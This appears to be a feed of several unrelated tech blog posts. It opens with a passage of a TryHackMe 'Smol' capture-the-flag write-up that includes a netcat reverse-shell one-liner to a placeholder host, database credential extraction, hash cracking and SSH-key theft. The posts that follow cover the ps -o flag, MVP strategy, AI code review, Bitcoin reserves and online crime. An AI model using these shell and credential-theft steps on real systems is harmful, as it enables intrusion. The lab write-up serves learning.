it.http://www.smol.thm/wp-admin/?cmd=whoamiExecuting this command confirmed it is possible to do remote command execution (RCE).With the help of ChatGPT, I crafted the following payload to establish a reverse shell connection:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP YOUR_PORT >/tmp/fAfter encoding it in using this website, I set up a and successfully obtained a .cmd%3Drm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20IP%20PORT%20%3E%2Ftmp%2FfTo stabilize the shell, I used:python3 -c 'import pty; pty.spawn("/bin/bash")'I then navigated to /home and found four users: Diego, Gege, Think, and Xavi.I tried to use cd, but it didn't work. So, I guess I have to extract the database credentials from /wp-config.php first.MySQL Database CredentialsChecking for open ports using:I identified MySQL running on port 3306.Using “ps aux” confirms it too.Using the wp-config.php credentials, I logged into and discovered that wpuser had extensive privileges, including CREATE USER, FILE, and SHUTDOWN permissions.Then, I set the database to wordpress and analyze the wp_users table.It returned a username and its hash.Cracking Diego’s Password using John The RipperI used Diego’s hash and stored it in a file with “:” as a separator to crack it using John The Ripper:john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt <hash-file>We successfully retrieved Diego’s password.Getting a shell as “Think”It seems like Diego can navigate through other users’ directories.In Gege’s directory, there’s a zip file called wordpress.old.zip, but I can't extract it.It looks like only Gege has the necessary permissions to access the file.So, I went to the “think” directory and found the .ssh folder. Inside, there was an id_rsa file. With this, I was able to SSH into "think."Now, we’re in as the “think” user.Getting Gege’s Shell by Reading /etc/pam.d/suI can’t find anything interesting, but this /etc/pam.d/su configuration file modifies the authentication process for the su command, allowing specific users to bypass password authentication. The first line, auth sufficient pam_rootok.so, permits the root user to switch users without a password. The second line, auth [success=ignore default=1] pam_succeed_if.so user = gege, checks if the user is "gege." If they are, the rule is ignored; otherwise, authentication proceeds to the next rule. The third line, auth sufficient pam_succeed_if.so use uid user = think, allows the user "think" to switch users without authentication.So, I tried switching to the “gege” user using the “think” account, and it worked — without requiring authentication.With Gege’s access, I was able to extract the zip file to my computer.It required a password, so I used zip2john to crack it.The attack was successful!After extracting the contents, I checked the wp-config.php file to see if there was anything interesting inside.Sure enough, I found the credentials for Xavi.Using these credentials, I switched to the Xavi user with su, and it worked.Misconfigured Sudo PrivilegesI tried to find SUID binaries but didn’t find anything powerful for privilege escalation. However, when I checked for misconfigured sudo privileges using sudo -l, it confirmed that the user had full sudo privileges across all commands and users.Taking advantage of this, I used it to read the root.txt file in the root directory, successfully retrieving the second flag!In this writeup, we demonstrated how various exploitation techniques were used to gain unauthorized access and escalate privileges in the TryHackMe Smol (CTF) challenge. Through a combination of reconnaissance, enumeration, WordPress exploitation, and privilege escalation, we successfully leveraged vulnerabilities such as Local File Inclusion (LFI), backdoored plugins, password hash cracking, and misconfigured sudo privileges to gain root access.

item.title: The Linux ps -o Flag: Unleashing the Power of Process Customization
item.author: Engineer
item.content:encoded: The ps command in Linux is a powerhouse for managing and inspecting running processes. Most users rely on basic options like ps aux or ps -ef, but today, we’ll explore a hidden gem: the -o flag. This option allows you to tailor the output ps exactly how you want, making it an indispensable tool for system administrators, developers, and DevOps professionals.The -o (format) flag in ps lets users specify exactly which process attributes they want to display. Instead of being stuck with the default columns, you get to choose relevant fields, reducing clutter and enhancing readability.Customization: Show only the information you need.Scripting-Friendly: Useful in automation where structured output is crucial.Readability: Get rid of unnecessary fields and focus on what matters.1. Displaying Process IDs and Command NamesThis provides a clear view of process IDs and their respective commands.2. Checking CPU and Memory Usage of Processesps -eo pid,%cpu,%mem,comm — sort=-%cpuNow, you instantly see which processes are consuming the most CPU.3. Finding the User Running Each ProcessThis is particularly useful when diagnosing permission or ownership issues.4. Formatting Start Times in a Readable WayNo more guessing when a process started!You can rename column headers with =:ps -eo pid=Process_ID,comm=CommandCombining multiple fields gives deeper insights:ps -eo pid,ppid,cmd,%cpu,%mem — sort=-%memThe ps -o flag is an underrated but immensely powerful feature that gives you total control over process monitoring. Whether you’re debugging an issue, writing scripts, or just want cleaner output, this flag is your best friend. Next time you type ps, ditch the defaults and craft your perfect view with -o!

item.title: The MVP Blueprint: How Lean Innovation and Team Alignment Drive Startup Success
item.author: Salome
item.content:encoded: Throughout years of building MVPs, my personal observations led me to believe that speed and adaptability are the make-or-break factors for the majority of startups. Every founder has heard the statistics: 42% of startups fail because they build something nobody wants. And roughly 80% of new products don’t make it past the launch phase. Sobering, right? That’s exactly why the Minimum Viable Product (MVP) approach isn’t just a trendy buzzword—it’s a survival strategy.\ An MVP isn’t about cutting corners or rushing out a half-baked prototype. It’s a smart, structured way to test assumptions, learn from real users, and avoid burning through time and money on features nobody actually needs. Eric Ries, the entrepreneur behind The Lean Startup, puts it best: “The minimum viable product is that version of a new product which allows a team to collect the maximum amount of validated learning about customers with the least effort.” In other words, an MVP is a calculated experiment—a way to get real-world feedback before committing to a full-scale launch.\ As a co-founder of Movadex, a development agency that has helped over 100 startups bring their products to market, I’ve spent years refining an MVP framework that balances speed, strategy, and adaptability. In this article, I’ll share my insights, explore real-world case studies, and highlight key lessons from my experience in working with innovative startups like TasteBuds, a social cooking app for couples, and CoVoice, a live translation marketplace.The Movadex MVP Framework: Lean Principles with a Proprietary TwistAfter working with so many founders, I saw firsthand what makes an MVP successful—and where many go wrong. That’s why I decided to develop Movadex’s MVP framework, which enables startups to focus on the right things at the right time. Our approach embraces the classic build-measure-learn cycle but integrates additional strategies that have consistently led to stronger, more resilient MVPs.Focus on the Core User and Problem (“Job to be Done”)Every great MVP starts with a laser-sharp understanding of who it’s for and what problem it solves. Instead of trying to please everyone, we advocate vertical positioning—zeroing in on a well-defined user segment with a pressing need. This follows Harvard Professor Clayton Christensen’s Jobs to Be Done theory: people “hire” products to perform a specific task.\ When we partnered with TasteBuds, we didn’t just create another recipe-sharing app. Instead, we helped them focus on tech-savvy millennial couples who loved cooking together. We excluded generic features, like basic cooking tips, and honed in on a specific social aspect—sharing cooking sessions with partners and friends. This ensured that the MVP wasn’t just another app in an oversaturated market but a highly targeted solution with a compelling use case. The founders of TasteBuds embraced this approach, and their engaged user base grew rapidly as a result.Build Fast, But With PurposeSpeed is essential in MVP development, but it’s not about shipping code recklessly. The real question is: What’s the smallest thing we can build right now to start learning? At Movadex, I urge the team to push startups to define their key hypotheses before writing a single line of code. For example, when working with CoVoice, we needed to test whether people would pay for real-time human translation. Instead of spending months building a feature-heavy platform, we launched with a simple model: one-to-one video calls with professional interpreters. This allowed us to validate demand before investing in a full-fledged system.\ I also always stress that speed should not compromise strategy. A good MVP balances rapid development with smart decision-making. We often encourage startups to leverage API tools and pre-built components for non-core features, so the focus remains on testing the riskiest assumptions first. CoVoice’s founders were highly engaged in this process, working closely with our team to ensure the MVP reflected their vision while remaining lean and adaptable.Strategic Feedback Loops (Measure and Learn)Launching an MVP isn’t the finish line—it’s just the beginning. The real work starts when user feedback starts rolling in. But too many startups drown in vague or misleading feedback. That’s why we emphasize structured feedback collection.\ For every MVP we help build, we define clear metrics upfront: retention rates, user engagement patterns, and qualitative user interviews. Take CoVoice, for example. Their early adopters loved the idea of live human interpreters but found it challenging to book sessions—some users felt shy or uncomfortable speaking with a person. Rather than guessing how to fix it, we tracked user behavior, gathered direct feedback, and quickly introduced an AI-powered translation feature. This allowed users to switch seamlessly between human and AI interpreters based on their comfort level. The result? A significant increase in user engagement, with many appreciating the flexibility and speed that AI provided, while still valuing the option of human interpreters when needed.\ The key lesson? Users will tell you what they want—if you set up the right mechanisms to listen. And once you have that data, you need a team that can move fast to iterate.Team Alignment is EverythingA common but overlooked pitfall in MVP development? Team misalignment. I’ve seen it happen too often—engineers perfecting features while business leaders just want a testable prototype, or designers pushing for interface excellence while the core functionality is still in flux.\ To avoid these conflicts, Movadex ensures that every team is aligned on the MVP’s goals from day one. We hold regular cross-functional check-ins, where engineers, designers, and founders review feedback together. This shared understanding prevents bottlenecks and enables rapid iteration. It was a game-changer for TasteBuds, CoVoice, and most of our MVP clients - the strong collaboration between the founders and developers meant that when challenges arose, we solved them quickly instead of getting stuck in endless debates. Their success demonstrates how alignment fuels agility and innovation.The Universal MVP Playbook: What Airbnb, Dropbox, and Uber Teach UsMovadex’s framework isn’t just theory—it aligns with how the world’s most successful startups approached their MVPs:Airbnb: Their first MVP was an ultra-lean experiment—renting out air mattresses in their own apartment. This validated demand for peer-to-peer rentals before they scaled.Dropbox: Instead of building an entire file-syncing platform, they launched with a simple demo video. Overnight, beta sign-ups jumped from 5,000 to 75,000, proving massive demand.Uber: They started small—just a few black cars in San Francisco, targeting tech workers. By starting local, they validated demand before expanding to new markets.\ The lesson? Start small. Validate assumptions. Iterate relentlessly.\ A great MVP isn’t about building fast—it’s about learning fast. The best startups don’t waste time on unnecessary features. They focus on solving a real problem for a specific audience, test their assumptions, and refine based on real-world feedback. And most importantly, they do this with a team that’s fully aligned and adaptable.\ If there’s one takeaway from my experience with Movadex, it’s this: The MVP isn’t just a product—it’s a mindset. One that embraces uncertainty, prioritizes learning, and moves fast without losing focus. Because in the end, the startups that survive aren’t necessarily the ones with the best initial idea—they’re the ones that evolve the smartest, based on what they learn.\ TasteBuds and CoVoice are just two examples of how startups can thrive by following a structured, feedback-driven MVP process. Their journeys reflect the power of strategic focus, rapid learning, and strong team alignment—principles that any startup can adopt to dramatically increase their chances of success.

item.title: RightsCon Community Calls for Urgent Release of Alaa Abd El-Fattah
item.author: Paige Collings
item.content:encoded: RightsCon participants gather in solidarity with the #FreeAlaa campaignThe calls to #FreeAlaa and save Laila were again reaffirmed during the closing ceremony in a keynote by Sara Alsherif, Migrant Digital Justice Programme Manager at Open Rights Group and close friend of Alaa. Referencing Alaa’s early work as a digital activist, Alsherif said: “He understood that the fight for digital rights is at the core of the struggle for human rights and democracy.” She closed by reminding the hundreds-strong audience that “Alaa could be any one of us … Please do for him what you would want us to do for you if you were in his position.”Laila Soueif and family meeting with UK Prime Minister Keir StarmerEvery second counts, and time is running out

item.title: The Next Big Leap in CI Coding is Codebase-context
item.author: Guy Eisenkot
item.content:encoded:
Since its launch in 2021, GitHub Copilot has reshaped software development, with surveys showing widespread adoption and perceived improvements in code quality. A study from , but success was measured by developers accepting Copilot’s suggestions rather than objective efficiency gains.\ Developers all across the spectrum are reporting a personal productivity boost, but in reality, the benefits to enterprise apps may be overstated— but a 41% rise in bugs, raising concerns beyond just reducing manual coding times. The reality is that many of the perceived efficiency gains from Copilot usage focus on the short-term gains. This poses a much larger problem than the inconvenience of manually writing boilerplate code. What developers are learning is that AI code generation is still very much in the .\ Even when AI-powered code generation saves time for developers, that time is often reclaimed during code reviews, ongoing maintenance, and incident response. Which is why post code generation, AI coding is a powerful tool to balance this overhead, while also improving the long term process for teams. 
 Let’s explore where and why AI Code Gen is falling short and what’s required to help developers successfully leverage AI-generated code and reviews.The key lies in retrospectiveCopilot’s output is constrained by the context it has. As a result, AI-generated code often fails to execute effectively in multi-repo, multi-language projects. While AI copilots and agents can accelerate code generation, overall productivity is still hindered by other critical development processes like code reviews, testing, integrating, building, deploying, etc.** 
 Copilot now considers not just the document you’re working on but also other open tabs in your IDE. However, this remains far short of the full context required to handle systems spanning multiple repositories, cloud environments and possibly even different runtimes – the context window is simply ineffective. ** 
 One major limitation is the lack of downstream impact data in the code generation process. In building my AI code review agent, testing with OpenTelemetry, I’m betting on CI/CD logs and tracing to enhance visibility and help agents better understand nuanced implementation details.I’m betting on CI/CD logs and tracing to enhance visibility and help agents better understand nuanced implementation details.\ Without this type of granular contextual awareness, AI coding agents won’t be able to correctly predict how new code will fully integrate with existing systems, often producing suggestions that misalign with broader project requirements.\ The context window for Copilot is constrained to what is directly in front of or behind the cursor and, potentially, other open documents in the IDE. When generating code, Copilot relies primarily on its large language model’s training on general programming patterns, not specific project conventions. While this makes the tool flexible, it often overlooks critical project-specific elements like naming conventions, architectural patterns, or dependencies between components spread across multiple repositories. 
 Unless your AI tool is highly customized and deeply integrated with your project (a resource-intensive endeavor for most teams), it cannot retain knowledge about the project’s history, evolution, or previous commits. This can lead to inconsistent or misaligned code suggestions, which are costly to fix later.When AI-generated code ends up in code reviewI mentioned that while time saved in generated code is now often time spent in the review. Suggestions that fail to align with project architecture risk introducing inconsistencies, which reviewers must manually uncover and resolve. Code that initially appears functional often results in technical debt or hidden bugs, increasing the workload for reviewers—or worse, causing production failures that must be fixed under the pressure of downtime. 
 
 Just as AI assistants lack the ability to account for multi-repository dependencies, code review tools often fail to provide a project-wide view. These limitations increase workloads for reviewers, who lack efficient ways to identify changes, spot dependencies, or assess the broader impacts of code modifications.\ The rapid adoption of AI tools has outpaced the development of frameworks to ensure code quality. Until more sophisticated tooling becomes standard, the rise in technical debt, production issues, and bugs will likely continue. This places additional pressure on development teams, who must balance faster deployments with intensified quality control.A new generation of AI code reviewersThe good news? A new generation of AI code assistants is emerging - but engineers should understand the pros and cons to get the most out of them.Baz focuses on automated pull request (PR) reviews with AI-driven suggestions and provides real-time feedback on code quality and best practices. By leveraging specialized models and embeddings, Baz generates code review suggestions that cover API impact and deep downstream analysis. It integrates with GitHub and has a standalone experience with a copilot chat functionality. It’s a strong platform for complex, multi-repo, multi-language code bases.\ At this time Baz is wholly focused on the code review cycle so has limited tooling as an IDE or code generation earlier in the development cycle. Full disclosure, this is my AI Code Review product that was just released in January.CodeRabbit is also hyper-focused on AI PR reviews by offering code explanations and improvement suggestions in areas like readability, security, and efficiency. It is particularly useful for small and medium-sized teams looking to streamline their review processes. However, it has limited customization for advanced AI review criteria and is not as comprehensive as others when it comes to code search and analysis. Developers have shared feedback that its AI-generated suggestions can sometimes be redundant or misaligned with a team’s coding conventions. It’s also free for open source projects.Graphite is designed to enhance developer workflows by enabling fast, incremental PRs with stacked diffs, helping maintain a cleaner Git history. It also includes AI-assisted code change summaries, making it easier for teams to review updates efficiently. While Graphite is excellent for workflow management, its primary focus has not been deep AI-driven code analysis and requires adoption of the platform, which includes a learning curve for teams unfamiliar with stacked diffs. 
 Sourcegraph is known for its powerful code search and intelligence tool, particularly well-suited for large codebases. In recent announcements they discuss how Cody, their coding agent allows for deep analysis across repositories and historical code trends, making it a valuable resource for developers needing advanced search capabilities. It also features AI-powered autocomplete and code explanations. It’s setup and indexing can create overhead for larger organizations and while it excels at code exploration, it is less focused on automated PR reviews.Bottom line: AI Code Review Needs Codebase ContextTracing and observability are productivity multipliers for code reviews, enabling developers to better understand complex, multi-repo, and multi-language environments. Cross-repo and cross-language visibility should be the baseline for large-scale projects – non-negotiable for today’s distributed applications. Tools that prioritize these capabilities will redefine code generation and review workflows, allowing AI to produce truly context-aware code tailored to modern software environments.

item.title: Meet Ocupe, The Startup Specializing in High-performance Marketing & Growth
item.author: Ocupe
item.content:encoded: \ Ocupe has been nominated in HackerNoon's annual Startups of The Year awards in São Paulo, Brazil.\ \ Read more about us below to understand why we deserve your vote.More than just an advertising agency, we are specialists in high-performance , assembling elite teams , tailored to each client’s goals.\ At Ocupe, we are constantly seeking innovative solutions through investments in new software, channels, strategies, and AI integration to deliver than traditional marketing.\ Our transparent business model allows clients to track tasks in real-time and see the time dedicated to each one, paying only for the work done—without commissions on media investments.How Ocupe achieved product-market fitCompanies and advertising agencies invest time and money in hiring and training internal marketing teams.\ Ocupe and by providing a high-caliber team that is ready to produce from day one—with agility and transparency. We take on the marketing workload so our clients can focus on their customers.We started with a small team and a strong drive to make things happen. All of us were already experienced advertising professionals with leadership backgrounds.\ At first, we focused solely on paid media, social media, and design. But as we gained more clients, new marketing demands emerged. To meet these needs, we expanded our pool of highly skilled professionals, bringing in experts in content, SEO, and other key marketing specialties.\ Today, Ocupe has high-caliber professionals and has served more than across different industries.Milestones and achievementsOcupe is an operational partner for largest agencies in Brazil.In November 2024 alone, we managed over in digital media—equivalent to 6% of Brazil’s total digital media investment that month.Our average growth rate exceeds 100% per year over the past three years, with more than managed in paid media.Ocupe has faced major challenges, such as acquiring clients without a large initial budget, balancing growth and profitability, building an elite team, and standing out in a highly competitive market.\ We overcame these barriers by testing hypotheses, listening to the market, and investing in smart acquisition strategies like content marketing and strategic partnerships. Additionally, we built a strong culture of agility and innovation through training and weekly process alignments.\ We have come a long way and are excited to continue growing with Ocupe’s expansion.What Startups of The Year means to usWe see this as an opportunity to showcase Ocupe’s potential on an international scale and highlight our transparent and creative approach to marketing.\ It is an honor to —an emerging powerhouse in the advertising market—and being recognized as Startup of the Year reinforces our commitment to transforming innovative marketing into a strategic growth engine for businesses.We built Ocupe by bringing together talented professionals who share the same purpose: to revolutionize how large companies do marketing. But this is just the beginning.\ We believe that dreaming big and executing with excellence is what will take us even further. We continue to expand our impact, ready to build the future of on-demand marketing.\ Want to nominate a startup? Follow the steps .:::info Wanna use this template? Click here.

item.title: How Not to Kill Your SaaS Product Before it Even Launches
item.author: Uchechi O.
item.content:encoded: SaaS product design is the process of creating user-friendly software/applications that give customers a solid reason to keep returning.\ Thomas Watson, Jnr, a retired IBM CEO rightly pointed out; “good design is good business”.\ That’s to say if you don’t have a good design for your product, I’m sorry to say, you may have killed your SaaS product even before its launch date.\ From my research, I realised that top companies invest heavily in product design. They spare no cost to understanding what makes their target market tick – no assumptions, 100% verified data. Then they create a product design in line with their findings; and voila!\ As we proceed, I’ll share my unique perspective on how to build a SaaS product design that will engage and retain customers, with an appealing ROI.Build a Dream Life for Your SaaS Customers – Know Your CustomersYou’ve heard it before: “Know your customers” – that’s the only way you can build a dream SaaS product design for them.\ This reminds me of when I was a teenager, I disagreed with my parents a lot, mostly because I didn’t know any better. The older I get, the more that I see… that my parents knew better. All they did was “try” to build a dream life for me because they knew me (as their child) and what was best for me in anticipation of a dream future.\ When it comes to business, you (the founder) are the “parent”, your product is your “parenting effort”, and your customers are your “kids”. You need to spend quality time and resources knowing your customers. That way, you can create a product design that can connect with them at a deeper level, making their lives easier.\ Victor Papanek, designer, educator, and author, said: “The only important thing about design is how it relates to people.”Get the Flow Before the Aesthetics.Do you know TikTok? Silly question, right? Who doesn’t?\ Well, TikTok has undoubtedly ranked as one of the most downloaded apps in the whole world for four years and counting. Do you know why? Because it has a functional interface – full-screen videos, uncluttered grid, and seamless navigation – the design is just perfect.\ Do not sacrifice a perfect design on the altar of aesthetics. Your focus should be on designing a functional product as opposed to a visually appealing one.\ Former CEO of Apple, Steve Jobs, once said: “Most people make the mistake of thinking design is what it looks like. People think it’s this veneer – that the designers are handed this box and told, ‘Make it look good!’ That’s not what we think it is. It’s not just what it looks like and feels like. Design is how it works.”Unique Tips on How Not to Kill Your SaaS Product with a Terrible SaaS Product DesignHere are some unique tips that can help you build an irresistible product design.If you can’t recognise the problem, from a peculiar perspective (if I may add), then you have no business creating a product design. This also applies to already existing products – they need constant redesign, update, and evolution to get users to keep coming back.\ Take Vine for instance; founded in 2012, and shut down in 2017. This social media app had great potential and made a great impact. It shut down partly because it failed to evolve beyond its core six-second looping video format – and that is a design error.Use surveys, interviews, and industry insights to find details about the problem in question.Refer to your customer service records for any complaints or compliments that may be in line with your idea.Collaborate with cross-functional teams to get their perspectives on the problem. “A problem shared is half-solved.”Have a visual representation of the problem to help with in-depth details about the problem.\ When you are well aware of what the problem is, then you can confidently approach your product design from a unique and well-informed perspective.Step back a bit and take a look at your “SaaS idea” again in light of your recent findings from stage one above. The picture should begin to form by now. Compare your findings to your competition and take notes.Compare your findings to similar products in the market and take note of any shortcomings or strengths.Brainstorm possible design solutions and explore every alternative.Collaborate with cross-functional teams to refine and enhance your analysis.\ This is the ideal stage to study brands with similar ideas but did not succeed. Learning from their mistakes can give you an edge.Create a user journey map:Now that you’ve analysed the problem in line with your idea, the next step is to factor in the usability of your product. To do that, you need to create a detailed user journey map.\ A user journey map is like a navigating tool for your customers, showing their first point of contact with the product, their level of interaction, and the point of exit.Note down how users feel about your existing product and similar products in the market. Find out how often and how long they interact with these products.Next, show how your idea can solve current pain points and increase usability without sacrificing seamless user experience.Check for practicality and demand. Ensure your product design has integrated features that fit into your customer’s daily routine.Create a service blueprint showing every skill and role required to bring your idea to life.\ A user journey map is basically anticipating customer experience from top to bottom.Now you’re almost halfway there. The key thing at the prototype stage is not to put all your eggs in one basket. Try different approaches before making a final decision.Don’t stress over aesthetics just yet – functionality comes first.Do not be scared to fail fast – the earlier you fail, the faster you get to your best option.\ The prototype stage allows you to, not just create, but also to experiment and tweak your product layout and interactions.Test and Iterate Information:\ This problem would have been averted if Apple and Pearson had taken their time to test and iterate the iPad applications before releasing them to the schools. That way, teachers wouldn’t have struggled so badly to teach with the iPads.Set up usability testing with real users to find out if they have any issues with your prototype.Pay attention to the human-to-system interactions and try to identify any gaps using the Human Factor principles.Every test is a step towards perfection, embrace user feedback and craft an exceptional product.

item.title: Is the U.S. Secretly Accumulating Bitcoin?
item.author: Amrendra Kumar Mishra
item.content:encoded: For years, Bitcoin and cryptocurrencies have been seen as an alternative to traditional financial systems. But what if the U.S. government is now considering Bitcoin as part of its strategic reserves? This idea, once dismissed as speculation, is gaining traction as more governments explore digital assets as a hedge against inflation and economic uncertainty. Could the U.S. be quietly stacking Bitcoin? And if so, what impact would it have on global finance? Let’s take a closer look.Is the U.S. Already Holding Bitcoin?There’s growing evidence that the U.S. government is already in possession of a significant amount of Bitcoin—not through direct purchases, but through asset seizures. Over the years, law enforcement agencies have confiscated billions of dollars worth of Bitcoin from criminal investigations, particularly from dark web operations like Silk Road. Normally, the government auctions off these seized assets, but in some cases, it appears they’ve held onto them for extended periods. This raises the question: Is there a shift in strategy? Several factors suggest that the U.S. might be warming up to the idea of Bitcoin as a long-term asset:\ • The Rise of Institutional Bitcoin Adoption – Major financial players like BlackRock, Fidelity, and even traditional banks are integrating Bitcoin into their portfolios.\ • Growing Interest in Digital Currencies – While the Federal Reserve is exploring a digital dollar (CBDC), Bitcoin remains the most established decentralized alternative.\ • – Countries like China and Russia are actively looking for alternatives to the U.S. dollar in trade. Bitcoin’s neutrality could make it a key player in the shifting financial landscape.Why Would the U.S. Consider Holding Bitcoin?A Hedge Against Inflation and DebtThe U.S. national debt is skyrocketing, and traditional fiat currencies continue to lose purchasing power. Bitcoin’s limited supply makes it a strong hedge against inflation, similar to gold. If central banks around the world begin adopting it as part of their reserves, the U.S. wouldn’t want to be left behind.Maintaining Financial DominanceWith China pushing for a digital yuan and other nations moving toward alternative financial systems, the U.S. may need to embrace digital assets to stay ahead. Bitcoin, as a global reserve asset, could give the U.S. a strategic advantage in future financial negotiations.Strengthening National SecurityBitcoin’s decentralized nature makes it resistant to censorship. As geopolitical tensions rise, a country holding Bitcoin reserves could ensure financial stability in times of global uncertainty, reducing reliance on traditional banking networks.Boosting the U.S. Crypto Industry & Web3 GrowthThe Web3 industry is expanding rapidly, with thousands of new crypto projects launching every year. From DeFi platforms to gaming and NFTs, blockchain innovation is at an all-time high. The growing trend of businesses and individuals looking to create tokens or deploy tokens on major blockchains highlights the increasing adoption of decentralized finance (DeFi) and smart contracts. If the U.S. officially recognizes Bitcoin and crypto as strategic assets, it could accelerate Web3 development, leading to even more decentralized applications and financial tools that redefine the global economy.Despite these advantages, there are still major hurdles:\ • – The U.S. government is still figuring out how to regulate crypto, and policy decisions remain inconsistent.• – Unlike gold, Bitcoin experiences massive price swings, which could make it a risky reserve asset.• Resistance from Traditional Financial Institutions – The Federal Reserve and major banks may see Bitcoin as a challenge to their existing monetary policies and could push back against its adoption.What Happens if the U.S. Officially Holds Bitcoin?If the U.S. were to announce that it’s adding Bitcoin to its reserves, the consequences would be huge:\ • Bitcoin’s Price Would Likely Surge – A U.S. government endorsement would be the ultimate signal of legitimacy, potentially driving prices to new highs.• Other Countries Might Follow – If the world’s largest economy embraces Bitcoin, other nations could feel pressured to do the same.• Institutional Confidence Would Grow – More corporations and financial institutions would likely start holding Bitcoin as a reserve asset. • The U.S. Dollar Could Evolve – Whether through a digital dollar or by integrating Bitcoin into financial markets, we could see significant shifts in how global finance operates.Final Thoughts: A Turning Point for Bitcoin?At this point, there’s no official confirmation that the U.S. is actively accumulating Bitcoin as part of its strategic reserves—but the signs are there. Whether through seized assets or a deliberate policy shift, the idea of Bitcoin as a reserve currency is becoming more realistic. With the Web3 space booming and blockchain adoption increasing, the U.S. has an opportunity to take the lead in this digital revolution. \ As more businesses and developers look to deploy tokens and create decentralized ecosystems, the demand for blockchain technology will only grow. If the U.S. does take this step, it could redefine Bitcoin’s role in the global economy, turning it from a speculative asset into a true financial powerhouse. The next few years will be crucial in determining how Bitcoin fits into the future of money. What do you think? Should the U.S. hold Bitcoin as part of its reserves? Let us know in the comments.

item.title: The Internet Has Spiraled Out of Control: Crimes, Scams, Cyberbullying, Theft & Deception
item.author: Matthew - Technology News Australia
item.content:encoded: :::warning Editor’s note: This story represents the views of the author of the story. The author is not affiliated with HackerNoon staff and wrote this story on their own. The HackerNoon editorial team has only verified the story for grammatical accuracy and does not condone/condemn any of the claims contained herein. #DYOR\ In the blink of an eye, the internet has evolved from a groundbreaking tool of knowledge, connectivity, and progress to a hotbed of crime, scams, cyberbullying, theft, fake news, unregulated content and fraud.\ Once a beacon of promise, the net now feels like a lawless, chaotic wild west where dangerous predators roam free, thriving in the dark corners of the web. What happened? Where did things go so wrong?\ Let’s start with the obvious: . From hacking rings to identity theft, cybercrime has exploded. Every day, thousands of people fall victim to criminal activities online. Hackers are no longer the lone wolves in their basements—they’re highly organized syndicates with deep pockets, professional tools, and no conscience.The stakes have risen so high that no one is safe.\ Personal data is sold on the black market like hotcakes, businesses are held ransom with ransomware attacks, and phishing schemes are more sophisticated than ever. These criminals know how to exploit every flaw, every weakness in the system, and they do so without fear of real consequence.\ Then, there’s the growing plague of . Have you received an email recently offering you millions of dollars for helping a “rich billionaire” move money? How about a message from an overseas “prince” who just needs your bank details to transfer a fortune into your account?\ Scams aren't just isolated incidents anymore. They’re an everyday occurrence. From fake job offers to fraudulent investment schemes promising "too good to be true" returns, the internet is flooded with schemes designed to separate people from their hard-earned cash.\ And the worst part? These scammers don’t even bother to hide their malicious intent anymore. Their deception is blatant, and platforms like Facebook, Instagram, and even LinkedIn are rife with scam ads and fraudulent accounts.\ But it doesn’t stop there— has become a pandemic of its own. Once a victim of bullying steps outside the walls of their home, they’re not safe anymore. In fact, they’re more vulnerable than ever.\ Social media platforms, which should be spaces for self-expression and connection, have instead become breeding grounds for hate, cruelty, and harassment. Kids and adults alike are subjected to relentless online torment—often with no way to escape it.\ The worst part? It’s hard to escape a situation that follows you everywhere. Cyberbullying doesn’t just stop at comments on a post. It’s personal attacks, death threats, stalking, and sometimes even the weaponization of personal information. It’s a toxic environment that’s turning people against each other, tearing apart communities, and ruining lives.\ We also have —not the kind with masks and getaway cars, but the type that happens in broad daylight, digitally. Data breaches are a daily occurrence, affecting individuals and large corporations alike.\ What’s more concerning is how these breaches are handled.
